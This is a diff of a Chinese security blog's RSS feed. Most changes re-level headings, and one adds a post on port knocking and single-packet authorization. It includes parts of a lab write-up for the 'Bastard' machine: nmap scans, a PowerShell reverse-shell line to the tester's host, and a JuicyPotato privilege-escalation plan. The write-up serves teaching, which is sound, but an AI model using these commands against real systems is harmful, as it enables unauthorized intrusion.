@@ -14,10 +14,10 @@
             <pubDate>Tue, 30 Dec 2025 17:29:33 +0800</pubDate>
             
             <guid>http://localhost:1313/posts/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E4%BB%A5-tsharktcpdumpwireshark-%E4%B8%BA%E4%BE%8B/</guid>
-            <description>&lt;h1 id=&#34;架构基础&#34;&gt;架构基础&lt;/h1&gt;
-&lt;h2 id=&#34;libpcappacket-pactrue-library&#34;&gt;Libpcap（Packet Pactrue Library）&lt;/h2&gt;
+            <description>&lt;h2 id=&#34;流量包分析&#34;&gt;流量包分析&lt;/h2&gt;
+&lt;h3 id=&#34;libpcappacket-pactrue-library&#34;&gt;Libpcap（Packet Pactrue Library）&lt;/h3&gt;
 &lt;p&gt;Libpcap 是 Unix/Linux 下的标准数据包捕获库，tshark、tcpdump、wireshark 都是通过获取这个接口实现抓包功能。&lt;/p&gt;
-&lt;h2 id=&#34;bpf&#34;&gt;BPF&lt;/h2&gt;
+&lt;h3 id=&#34;bpf&#34;&gt;BPF&lt;/h3&gt;
 &lt;p&gt;执行流程：&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;用户在命令行输入高级过滤语句。&lt;/li&gt;
@@ -25,14 +25,14 @@
 &lt;li&gt;BPF 指令加载到内核，在虚拟机中运行。&lt;/li&gt;
 &lt;li&gt;过滤过的包加载到用户缓冲区。&lt;/li&gt;
 &lt;/ol&gt;
-&lt;h1 id=&#34;工具对比&#34;&gt;工具对比&lt;/h1&gt;
-&lt;h2 id=&#34;tcpdump&#34;&gt;tcpdump&lt;/h2&gt;
+&lt;h2 id=&#34;工具对比&#34;&gt;工具对比&lt;/h2&gt;
+&lt;h3 id=&#34;tcpdump&#34;&gt;tcpdump&lt;/h3&gt;
 &lt;p&gt;tcpdump 是最轻量、最基础的捕获工具，快速、可靠，可以在 ssh 中使用。&lt;/p&gt;
-&lt;h2 id=&#34;tshark&#34;&gt;tshark&lt;/h2&gt;
+&lt;h3 id=&#34;tshark&#34;&gt;tshark&lt;/h3&gt;
 &lt;p&gt;tshark 是 wireshark 的完整命令行模式，调用 dumpcap 进行实际捕获。&lt;/p&gt;
-&lt;h2 id=&#34;wireshark&#34;&gt;wireshark&lt;/h2&gt;
+&lt;h3 id=&#34;wireshark&#34;&gt;wireshark&lt;/h3&gt;
 &lt;p&gt;wireshark 拥有完整的 ui 界面。&lt;/p&gt;
-&lt;h2 id=&#34;用法分析&#34;&gt;用法分析&lt;/h2&gt;
+&lt;h3 id=&#34;用法分析&#34;&gt;用法分析&lt;/h3&gt;
 &lt;p&gt;&lt;code&gt;-f &#39;host 10.10.10.45&#39;&lt;/code&gt; 的语法在 tshark、tcpdump、wireshark 等流量分析工具中是通用的，即 BPF 语法。它是一种在内核层面进行的数据包过滤机制，它允许网络抓包工具在数据包传输到用户空间之前就进行筛选，从而大大提高了捕获效率，BPF 提供了一套虚拟指令集，用户可以编写规则，内核在接收到每个数据包时按照这些规则进行判断，只有符合条件的数据包才会被传输到用户空间进行进一步处理，由于在内核中进行过滤能够避免将大量不必要的数据包拷贝到用户空间，这种设计不仅优化了性能，还降低了系统资源的消耗，使得 BPF 成为了许多网络分析、监控和安全审计工具的核心组件。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;P1.png&#34; alt=&#34;P1&#34;&gt;&lt;/p&gt;
 &lt;p&gt;例如上面这个执行结果，10.10.10.145 这台主机以 UDP 协议向广播地址 255.255.255.255 发送数据包，流量呈现出明显的周期性和两种不同特征，数据包大概每隔 60 秒成对出现，一类数据包显示 UDP，字段为 139，负载较小，一类数据包显示 UDP，字段为 514，负载较大。周期内数据包发送顺序可能互换，表明了主机很可能在进行某种广播式的服务或心跳检测，利用 UDP 的无连接特性通过广播方式向网络中其他设备通告状态信息或探测服务。整个流量特征体现了主动广播、定时发送以及数据包大小与内容明显区分的规律性，这在网络设备中并不罕见，有必要进一步看具体的数据意义。&lt;/p&gt;
@@ -42,10 +42,10 @@ tsahrk -r Enilmalus.pcap -V
 
 tshark -r Enilmalus.pcap -T fields -e data | tr -d &amp;#39; &amp;#39; | xxd -r -p
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解释一下最底下这个命令，这是一个完整的网络数据分析流程，从抓包文件 Enilmalus.pcap 中提取原始数据并将其转换为人类可读的文件。命令从 tshark 开始，它是 wireshark 的命令行版本，用于处理网络流量，前面捕捉流量，现在读取，-r 时 read 的缩写，指示 tshark 从 Enilmalus.pcap 中读取数据：-T 是 type 的缩写，指定输出类型为 fields（字段），表示以字段形式输出而不是完整的数据包详情；-e 是 extract 的缩写，后面接 data，告诉 tshark 提取每个数据包的原始负载，通常以十六进制字符串形式输出，例如 &lt;code&gt;48 65 6c 6c 6f&lt;/code&gt;。接着，管道符号 &lt;code&gt;|&lt;/code&gt; 将输出传递给 tr ，这是一个 translate 的工具；-d 是 delete 的缩写，后面跟 &lt;code&gt;&#39; &#39;&lt;/code&gt; ，表示一处所有空格，表示移除所有空格，把带空格的 &lt;code&gt;48 65 6c 6c 6f&lt;/code&gt; 变成 &lt;code&gt;48656c6c6f&lt;/code&gt;。最后，另一个管道  &lt;code&gt;|&lt;/code&gt; 将结果交给 xxd。一个处理十六进制字符串的工具，其名称为 &lt;code&gt;hexadecimal&lt;/code&gt; 和 &lt;code&gt;dump&lt;/code&gt; 的组合，用于创建或解析数据的十六进制转储；-r 是 reverse 的缩写，表示将十六进制字符串转换为二进制；-p 是 plaintext 的缩写，处理没有分隔符的连续十六进制字符串，最终 &lt;code&gt;48656c6c6f&lt;/code&gt; 解读为可读的 &lt;code&gt;Hello&lt;/code&gt;。&lt;/p&gt;</description>
-            <content type="html"><![CDATA[<h1 id="架构基础">架构基础</h1>
-<h2 id="libpcappacket-pactrue-library">Libpcap（Packet Pactrue Library）</h2>
+            <content type="html"><![CDATA[<h2 id="流量包分析">流量包分析</h2>
+<h3 id="libpcappacket-pactrue-library">Libpcap（Packet Pactrue Library）</h3>
 <p>Libpcap 是 Unix/Linux 下的标准数据包捕获库，tshark、tcpdump、wireshark 都是通过获取这个接口实现抓包功能。</p>
-<h2 id="bpf">BPF</h2>
+<h3 id="bpf">BPF</h3>
 <p>执行流程：</p>
 <ol>
 <li>用户在命令行输入高级过滤语句。</li>
@@ -53,14 +53,14 @@ tshark -r Enilmalus.pcap -T fields -e data | tr -d &amp;#39; &amp;#39; | xxd -r 
 <li>BPF 指令加载到内核，在虚拟机中运行。</li>
 <li>过滤过的包加载到用户缓冲区。</li>
 </ol>
-<h1 id="工具对比">工具对比</h1>
-<h2 id="tcpdump">tcpdump</h2>
+<h2 id="工具对比">工具对比</h2>
+<h3 id="tcpdump">tcpdump</h3>
 <p>tcpdump 是最轻量、最基础的捕获工具，快速、可靠，可以在 ssh 中使用。</p>
-<h2 id="tshark">tshark</h2>
+<h3 id="tshark">tshark</h3>
 <p>tshark 是 wireshark 的完整命令行模式，调用 dumpcap 进行实际捕获。</p>
-<h2 id="wireshark">wireshark</h2>
+<h3 id="wireshark">wireshark</h3>
 <p>wireshark 拥有完整的 ui 界面。</p>
-<h2 id="用法分析">用法分析</h2>
+<h3 id="用法分析">用法分析</h3>
 <p><code>-f 'host 10.10.10.45'</code> 的语法在 tshark、tcpdump、wireshark 等流量分析工具中是通用的，即 BPF 语法。它是一种在内核层面进行的数据包过滤机制，它允许网络抓包工具在数据包传输到用户空间之前就进行筛选，从而大大提高了捕获效率，BPF 提供了一套虚拟指令集，用户可以编写规则，内核在接收到每个数据包时按照这些规则进行判断，只有符合条件的数据包才会被传输到用户空间进行进一步处理，由于在内核中进行过滤能够避免将大量不必要的数据包拷贝到用户空间，这种设计不仅优化了性能，还降低了系统资源的消耗，使得 BPF 成为了许多网络分析、监控和安全审计工具的核心组件。</p>
 <p><img src="P1.png" alt="P1"></p>
 <p>例如上面这个执行结果，10.10.10.145 这台主机以 UDP 协议向广播地址 255.255.255.255 发送数据包，流量呈现出明显的周期性和两种不同特征，数据包大概每隔 60 秒成对出现，一类数据包显示 UDP，字段为 139，负载较小，一类数据包显示 UDP，字段为 514，负载较大。周期内数据包发送顺序可能互换，表明了主机很可能在进行某种广播式的服务或心跳检测，利用 UDP 的无连接特性通过广播方式向网络中其他设备通告状态信息或探测服务。整个流量特征体现了主动广播、定时发送以及数据包大小与内容明显区分的规律性，这在网络设备中并不罕见，有必要进一步看具体的数据意义。</p>
@@ -74,6 +74,54 @@ tshark -r Enilmalus.pcap -T fields -e data | tr -d &#39; &#39; | xxd -r -p
         </item>
         
         <item>
+            <title>端口敲门与单包授权与零开端口</title>
+            <link>http://localhost:1313/posts/%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8%E5%8D%95%E5%8C%85%E6%8E%88%E6%9D%83%E4%B8%8E%E9%9B%B6%E5%BC%80%E7%AB%AF%E5%8F%A3/</link>
+            <pubDate>Tue, 30 Dec 2025 17:29:33 +0800</pubDate>
+            
+            <guid>http://localhost:1313/posts/%E7%AB%AF%E5%8F%A3%E6%95%B2%E9%97%A8%E5%8D%95%E5%8C%85%E6%8E%88%E6%9D%83%E4%B8%8E%E9%9B%B6%E5%BC%80%E7%AB%AF%E5%8F%A3/</guid>
+            <description>&lt;h2 id=&#34;端口敲门&#34;&gt;端口敲门&lt;/h2&gt;
+&lt;p&gt;端口敲门（port knocking）技术是一种基于隐蔽认证的安全机制，允许在默认关闭所有入站端口的情况下，仅通过特定顺序的端口访问来动态开放特定服务。其核心思想是服务器在初始状态下屏蔽所有连接，只有当客户端按预设顺序向多个端口发送数据包时，服务器才能识别合法模式并临时修改防火墙规则，允许特定 IP 访问受保护的端口，比如 SSH、RDP、Web 服务等。这种方式可以隐藏关键端口，防止端口扫描工具探测到开放的服务，从而降低被攻击的风险。&lt;/p&gt;
+&lt;p&gt;实现端口敲门通常依赖 knockd 这类监听工具，它监测入站数据包，识别预定义的敲门序列，并在匹配成功后执行相应的防火墙命令。例如，可以配置规则服务器在接收到 &lt;code&gt;7000-&amp;gt;8000-&amp;gt;9000&lt;/code&gt; 端口顺序连接后，动态放行 SSH 端口，同时可以设定 &lt;code&gt;9000-&amp;gt;8000-&amp;gt;7000&lt;/code&gt; 作为关闭 SSH 端口的敲门序列。客户端只需要发送正确的敲门请求，就能临时开启远程管理端口，使用 SSH 连接服务器，操作完成后再敲门恢复防火墙规则，确保端口重新关闭。&lt;/p&gt;
+&lt;p&gt;这种方式的优点在于可以有效减少攻击面，避免端口扫描暴露服务，适合用于保护 SSH 等关键管理端口，同时不需要额外的 VPN 或复杂的加密认证方案，资源占用极低。然而，端口敲门也有明显的局限性，比如攻击者能监听流量，就可能获取端口序列并复现攻击。此外，每次访问都需要先发送敲门序列，增加运维成本。为了解决这个问题，可以使用更安全的 &lt;code&gt;单包授权（SPA）&lt;/code&gt; 机制，例如 fwknop 这类工具，它通过 GnuPG 加密的单一 UDP 数据包进行认证，避免传统敲门方式可能被监听和重放的风险。&lt;/p&gt;
+&lt;p&gt;在实际应用中，端口敲门适用于 SSH 服务器的控制访问、隐藏数据库和管理面板等关键服务、以及提供短期远程管理权限，特别是在企业安全策略中，可作为 &lt;code&gt;零开端口（Zero Open Port）&lt;/code&gt; 方案的一部分，有效减少暴露面，提高服务器安全性。&lt;/p&gt;
+&lt;p&gt;下面是端口敲门的命令演示：&lt;/p&gt;
+&lt;p&gt;knock 敲门演示：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
+└─$ knock -v 10.10.10.45 197 719 801 983
+hitting tcp 10.10.10.45:197
+hitting tcp 10.10.10.45:719
+hitting tcp 10.10.10.45:801
+hitting tcp 10.10.10.45:983
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;nc 敲门演示：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
+└─$ for port in 197 719 801 983 ; do nc -zv 10.10.10.45 $port;sleep 1; done
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解释一下这个 nc 命令，先循环这四个端口，依次赋值给 $port ，接着 nc 使用 -z 零模式，只尝试连接，不发送任何数据，连接成功说明端口开放，-v 详细输出，显示连接结果，暂停 1 秒接着执行。&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="端口敲门">端口敲门</h2>
+<p>端口敲门（port knocking）技术是一种基于隐蔽认证的安全机制，允许在默认关闭所有入站端口的情况下，仅通过特定顺序的端口访问来动态开放特定服务。其核心思想是服务器在初始状态下屏蔽所有连接，只有当客户端按预设顺序向多个端口发送数据包时，服务器才能识别合法模式并临时修改防火墙规则，允许特定 IP 访问受保护的端口，比如 SSH、RDP、Web 服务等。这种方式可以隐藏关键端口，防止端口扫描工具探测到开放的服务，从而降低被攻击的风险。</p>
+<p>实现端口敲门通常依赖 knockd 这类监听工具，它监测入站数据包，识别预定义的敲门序列，并在匹配成功后执行相应的防火墙命令。例如，可以配置规则服务器在接收到 <code>7000-&gt;8000-&gt;9000</code> 端口顺序连接后，动态放行 SSH 端口，同时可以设定 <code>9000-&gt;8000-&gt;7000</code> 作为关闭 SSH 端口的敲门序列。客户端只需要发送正确的敲门请求，就能临时开启远程管理端口，使用 SSH 连接服务器，操作完成后再敲门恢复防火墙规则，确保端口重新关闭。</p>
+<p>这种方式的优点在于可以有效减少攻击面，避免端口扫描暴露服务，适合用于保护 SSH 等关键管理端口，同时不需要额外的 VPN 或复杂的加密认证方案，资源占用极低。然而，端口敲门也有明显的局限性，比如攻击者能监听流量，就可能获取端口序列并复现攻击。此外，每次访问都需要先发送敲门序列，增加运维成本。为了解决这个问题，可以使用更安全的 <code>单包授权（SPA）</code> 机制，例如 fwknop 这类工具，它通过 GnuPG 加密的单一 UDP 数据包进行认证，避免传统敲门方式可能被监听和重放的风险。</p>
+<p>在实际应用中，端口敲门适用于 SSH 服务器的控制访问、隐藏数据库和管理面板等关键服务、以及提供短期远程管理权限，特别是在企业安全策略中，可作为 <code>零开端口（Zero Open Port）</code> 方案的一部分，有效减少暴露面，提高服务器安全性。</p>
+<p>下面是端口敲门的命令演示：</p>
+<p>knock 敲门演示：</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
+└─$ knock -v 10.10.10.45 197 719 801 983
+hitting tcp 10.10.10.45:197
+hitting tcp 10.10.10.45:719
+hitting tcp 10.10.10.45:801
+hitting tcp 10.10.10.45:983
+</code></pre><p>nc 敲门演示：</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
+└─$ for port in 197 719 801 983 ; do nc -zv 10.10.10.45 $port;sleep 1; done
+</code></pre><p>解释一下这个 nc 命令，先循环这四个端口，依次赋值给 $port ，接着 nc 使用 -z 零模式，只尝试连接，不发送任何数据，连接成功说明端口开放，-v 详细输出，显示连接结果，暂停 1 秒接着执行。</p>
+<h2 id="单包授权spa">单包授权（SPA）</h2>
+<p>单包授权（SPA，Single Packet Authorization）是一种通过单个网络数据包完成身份验证，从而零食开放访问权限的安全技术。未通过认证前服务对外不开放，只有合法客户端发出一个携带认证信息的单包（可以是 UDP/TCP/ICMP，内涵加密后的身份信息、令牌等），通过认证后才会临时开放服务。</p>
+<p>传统 TCP/IP 的原则为 先连后验，端口必须对外开放，连接建立后才做认证。</p>
+<h2 id="零开端口zero-open-port">零开端口（Zero Open Port）</h2>
+<p>零开端口（Zero Open Port）就是对外关闭所有端口，无任何服务监听。</p>
+]]></content>
+        </item>
+        
+        <item>
             <title>Bastard Writeup</title>
             <link>http://localhost:1313/posts/bastard-writeup/</link>
             <pubDate>Sun, 28 Dec 2025 17:29:33 +0800</pubDate>
@@ -81,8 +129,8 @@ tshark -r Enilmalus.pcap -T fields -e data | tr -d &#39; &#39; | xxd -r -p
             <guid>http://localhost:1313/posts/bastard-writeup/</guid>
             <description>&lt;blockquote&gt;
 &lt;p&gt;本文章以 kali 地址为 10.10.16.46 做演示&lt;/p&gt;&lt;/blockquote&gt;
-&lt;h1 id=&#34;初始侦察&#34;&gt;初始侦察&lt;/h1&gt;
-&lt;h2 id=&#34;nmap-端口扫描&#34;&gt;nmap 端口扫描&lt;/h2&gt;
+&lt;h2 id=&#34;初始侦察&#34;&gt;初始侦察&lt;/h2&gt;
+&lt;h3 id=&#34;nmap-端口扫描&#34;&gt;nmap 端口扫描&lt;/h3&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
 └─$ sudo nmap --min-rate 10000 -p- 10.129.6.171 -oA nmap/ports
 [sudo] password for kali: 
@@ -96,7 +144,7 @@ PORT      STATE SERVICE
 49154/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 15.57 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;nmap-详细信息扫描&#34;&gt;nmap 详细信息扫描&lt;/h2&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;nmap-详细信息扫描&#34;&gt;nmap 详细信息扫描&lt;/h3&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
 └─$ sudo nmap -sT -sC -sV -O -p80,135,49154 10.129.6.171 -oA nmap/detail 
 [sudo] password for kali: 
@@ -131,8 +179,8 @@ Nmap done: 1 IP address (1 host up) scanned in 76.10 seconds
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开放了 80、135、49154，详细信息扫描表明靶机跑在 Windows 下的 IIS 7.5上，运行的是 Drupal 7 服务，通过 ping 返回值为 ttl=127 确定为 Windows 操作系统，同时 80 端口暴露出了 includes、LICENSE.txt、robots.txt 等目录。&lt;/p&gt;</description>
             <content type="html"><![CDATA[<blockquote>
 <p>本文章以 kali 地址为 10.10.16.46 做演示</p></blockquote>
-<h1 id="初始侦察">初始侦察</h1>
-<h2 id="nmap-端口扫描">nmap 端口扫描</h2>
+<h2 id="初始侦察">初始侦察</h2>
+<h3 id="nmap-端口扫描">nmap 端口扫描</h3>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ sudo nmap --min-rate 10000 -p- 10.129.6.171 -oA nmap/ports
 [sudo] password for kali: 
@@ -146,7 +194,7 @@ PORT      STATE SERVICE
 49154/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 15.57 seconds
-</code></pre><h2 id="nmap-详细信息扫描">nmap 详细信息扫描</h2>
+</code></pre><h3 id="nmap-详细信息扫描">nmap 详细信息扫描</h3>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ sudo nmap -sT -sC -sV -O -p80,135,49154 10.129.6.171 -oA nmap/detail 
 [sudo] password for kali: 
@@ -181,7 +229,7 @@ Nmap done: 1 IP address (1 host up) scanned in 76.10 seconds
 </code></pre><p>开放了 80、135、49154，详细信息扫描表明靶机跑在 Windows 下的 IIS 7.5上，运行的是 Drupal 7 服务，通过 ping 返回值为 ttl=127 确定为 Windows 操作系统，同时 80 端口暴露出了 includes、LICENSE.txt、robots.txt 等目录。</p>
 <blockquote>
 <p>Drupal 是一个开源的内容管理系统，由 PHP 编写，主要用于构建和管理复杂网站</p></blockquote>
-<h2 id="nmap-udp-扫描">nmap udp 扫描</h2>
+<h3 id="nmap-udp-扫描">nmap udp 扫描</h3>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ sudo nmap -sU -Pn --top-ports 20 10.129.6.171 -oA nmap/udp   
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 08:21 EST
@@ -212,7 +260,7 @@ PORT      STATE         SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 5.16 seconds
 </code></pre><p>没有明确开放的状态，攻击面基本为零，可以后续按需再深入扫描。</p>
-<h2 id="nmap-漏洞脚本扫描">nmap 漏洞脚本扫描</h2>
+<h3 id="nmap-漏洞脚本扫描">nmap 漏洞脚本扫描</h3>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ sudo nmap --script=vuln -p80,135,49154 10.129.6.171 -oA nmap/vuln
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-28 08:22 EST
@@ -268,12 +316,12 @@ PORT      STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 6080.55 seconds
 </code></pre><p>没有新的有价值的东西</p>
-<h2 id="whatweb-探测">whatweb 探测</h2>
+<h3 id="whatweb-探测">whatweb 探测</h3>
 <p>通过 whatweb 可以进一步查看到 Drupal 的信息，进一步交叉验证系统和应用的情况。</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ whatweb 10.129.6.171                                                
 http://10.129.6.171 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.129.6.171], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
-</code></pre><h2 id="web-80-端口渗透">web-80 端口渗透</h2>
+</code></pre><h3 id="web-80-端口渗透">web-80 端口渗透</h3>
 <p>根据 nmap 的扫描结果添加 hosts 记录：</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ sudo bash -c &#39;echo &#34;10.129.6.171 drupal.htb&#34; &gt;&gt; /etc/hosts&#39;
@@ -636,7 +684,7 @@ d89b289c7eff24c7b2de8cea489cf1e4
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.46 -Port 443
 </code></pre><p>开启监听获得反弹 shell。</p>
 <p><img src="%E5%8F%8D%E5%BC%B9shell.png" alt="反弹shell"></p>
-<h2 id="提权">提权</h2>
+<h3 id="提权">提权</h3>
 <p>靶机的操作系统为小于 Windows Server 2019，且开启了 SeImpersonate。可以使用 juicy-potato 提权。</p>
 <pre tabindex="0"><code>PS C:\inetpub\drupal-7.54&gt;whoami /priv
 
@@ -721,8 +769,8 @@ At line:128 char:21
             <pubDate>Sun, 28 Dec 2025 17:29:33 +0800</pubDate>
             
             <guid>http://localhost:1313/posts/curl-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</guid>
-            <description>&lt;h1 id=&#34;curl-原理剖析&#34;&gt;curl 原理剖析&lt;/h1&gt;
-&lt;h2 id=&#34;curl-核心机制&#34;&gt;curl 核心机制&lt;/h2&gt;
+            <description>&lt;h2 id=&#34;curl-原理剖析&#34;&gt;curl 原理剖析&lt;/h2&gt;
+&lt;h3 id=&#34;curl-核心机制&#34;&gt;curl 核心机制&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;Libcurl 驱动：curl 是 libcurl 库的命令行前端，实际上 curl 的每一个参数都在映射 libcurl 的 curl_easy_setopt()  函数调用。&lt;/li&gt;
 &lt;li&gt;协议自动协商：curl 不仅发送 HTTP，它会根据 URL scheme（ftp://、dict://、gopher://）自动切换底层协议栈。&lt;/li&gt;
@@ -730,8 +778,8 @@ At line:128 char:21
 &lt;/ul&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Libcurl 是 curl 项目提供的跨平台 C 库，用于处理 URL 数据传输，支持 HTTP、FTP、SMTP 等多种协议。&lt;/p&gt;&lt;/blockquote&gt;
-&lt;h1 id=&#34;curl-参数详解&#34;&gt;curl 参数详解&lt;/h1&gt;
-&lt;h2 id=&#34;curl-帮助命令&#34;&gt;curl 帮助命令&lt;/h2&gt;
+&lt;h2 id=&#34;curl-参数详解&#34;&gt;curl 参数详解&lt;/h2&gt;
+&lt;h3 id=&#34;curl-帮助命令&#34;&gt;curl 帮助命令&lt;/h3&gt;
 &lt;p&gt;下面为 curl 详细地帮助命令&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Work/Kali]
 └─$ curl -h                             
@@ -754,11 +802,11 @@ Use &amp;#34;--help category&amp;#34; to get an overview of all categories, whic
 auth, connection, curl, deprecated, dns, file, ftp, global, http, imap, ldap, output, pop3, post, proxy, scp, sftp, smtp, ssh, telnet, tftp, timeout, tls, upload, verbose.
 Use &amp;#34;--help all&amp;#34; to list all options
 Use &amp;#34;--help [option]&amp;#34; to view documentation for a given option
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;参数详解&#34;&gt;参数详解&lt;/h2&gt;
-&lt;h3 id=&#34;-ddata-data-参数&#34;&gt;-d/&amp;ndash;data &amp;lt;data&amp;gt; 参数&lt;/h3&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;参数详解&#34;&gt;参数详解&lt;/h3&gt;
+&lt;h4 id=&#34;-ddata-data-参数&#34;&gt;-d/&amp;ndash;data &amp;lt;data&amp;gt; 参数&lt;/h4&gt;
 &lt;p&gt;使用 -d 参数，curl 默认将 HTTP 方法切换为 POST，默认 Content-Type 被设置为 &lt;code&gt;application/x-www-form-urlencoded&lt;/code&gt; 。&lt;/p&gt;</description>
-            <content type="html"><![CDATA[<h1 id="curl-原理剖析">curl 原理剖析</h1>
-<h2 id="curl-核心机制">curl 核心机制</h2>
+            <content type="html"><![CDATA[<h2 id="curl-原理剖析">curl 原理剖析</h2>
+<h3 id="curl-核心机制">curl 核心机制</h3>
 <ul>
 <li>Libcurl 驱动：curl 是 libcurl 库的命令行前端，实际上 curl 的每一个参数都在映射 libcurl 的 curl_easy_setopt()  函数调用。</li>
 <li>协议自动协商：curl 不仅发送 HTTP，它会根据 URL scheme（ftp://、dict://、gopher://）自动切换底层协议栈。</li>
@@ -766,8 +814,8 @@ Use &amp;#34;--help [option]&amp;#34; to view documentation for a given option
 </ul>
 <blockquote>
 <p>Libcurl 是 curl 项目提供的跨平台 C 库，用于处理 URL 数据传输，支持 HTTP、FTP、SMTP 等多种协议。</p></blockquote>
-<h1 id="curl-参数详解">curl 参数详解</h1>
-<h2 id="curl-帮助命令">curl 帮助命令</h2>
+<h2 id="curl-参数详解">curl 参数详解</h2>
+<h3 id="curl-帮助命令">curl 帮助命令</h3>
 <p>下面为 curl 详细地帮助命令</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ curl -h                             
@@ -790,37 +838,37 @@ Use &#34;--help category&#34; to get an overview of all categories, which are:
 auth, connection, curl, deprecated, dns, file, ftp, global, http, imap, ldap, output, pop3, post, proxy, scp, sftp, smtp, ssh, telnet, tftp, timeout, tls, upload, verbose.
 Use &#34;--help all&#34; to list all options
 Use &#34;--help [option]&#34; to view documentation for a given option
-</code></pre><h2 id="参数详解">参数详解</h2>
-<h3 id="-ddata-data-参数">-d/&ndash;data &lt;data&gt; 参数</h3>
+</code></pre><h3 id="参数详解">参数详解</h3>
+<h4 id="-ddata-data-参数">-d/&ndash;data &lt;data&gt; 参数</h4>
 <p>使用 -d 参数，curl 默认将 HTTP 方法切换为 POST，默认 Content-Type 被设置为 <code>application/x-www-form-urlencoded</code> 。</p>
-<h3 id="-tupload-file-file-参数">-T/&ndash;upload-file &lt;file&gt; 参数</h3>
+<h4 id="-tupload-file-file-参数">-T/&ndash;upload-file &lt;file&gt; 参数</h4>
 <p>文件上传</p>
-<h3 id="-auser-agent-name-参数">-A/&ndash;user-agent &lt;name&gt; 参数</h3>
+<h4 id="-auser-agent-name-参数">-A/&ndash;user-agent &lt;name&gt; 参数</h4>
 <p>修改 HTTP 请求头中的 User-Agent 字段</p>
-<h3 id="-uuser-userpassword-参数">-u/&ndash;user &lt;user:password&gt; 参数</h3>
+<h4 id="-uuser-userpassword-参数">-u/&ndash;user &lt;user:password&gt; 参数</h4>
 <p>将 user:password 进行 Base64 编码，并添加到 <code>Header: Authorization: Basic &lt;base64_string&gt;。</code></p>
-<h3 id="-vverbose-参数">-v/&ndash;verbose 参数</h3>
+<h4 id="-vverbose-参数">-v/&ndash;verbose 参数</h4>
 <p>这个参数是笔者在实际渗透测试中最常用的参数之一，作用为开启详细模式，便于阅读返回的数据。</p>
-<h3 id="-ishow-headers-参数">-i/&ndash;show-headers 参数</h3>
+<h4 id="-ishow-headers-参数">-i/&ndash;show-headers 参数</h4>
 <p>查看响应头。</p>
-<h3 id="-ffail-参数">-f/&ndash;fail 参数</h3>
+<h4 id="-ffail-参数">-f/&ndash;fail 参数</h4>
 <p>即使服务器返回 404 或 500 也会输出页面内容。</p>
-<h3 id="-o-filename-o">-o filename/-O</h3>
+<h4 id="-o-filename-o">-o filename/-O</h4>
 <ul>
 <li>-o enil：重命名保存为名称为 enil 的文件。</li>
 <li>-O：原名保存。</li>
 </ul>
-<h3 id="-s-参数">-s 参数</h3>
+<h4 id="-s-参数">-s 参数</h4>
 <p>静默模式，不显示进度条。</p>
 ]]></content>
         </item>
         
         <item>
-            <title>渗透测试方法论（2025.12.27总结）【建设中】</title>
-            <link>http://localhost:1313/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA2025.12.27%E6%80%BB%E7%BB%93/</link>
+            <title>渗透测试方法论</title>
+            <link>http://localhost:1313/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/</link>
             <pubDate>Sat, 27 Dec 2025 17:29:33 +0800</pubDate>
             
-            <guid>http://localhost:1313/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA2025.12.27%E6%80%BB%E7%BB%93/</guid>
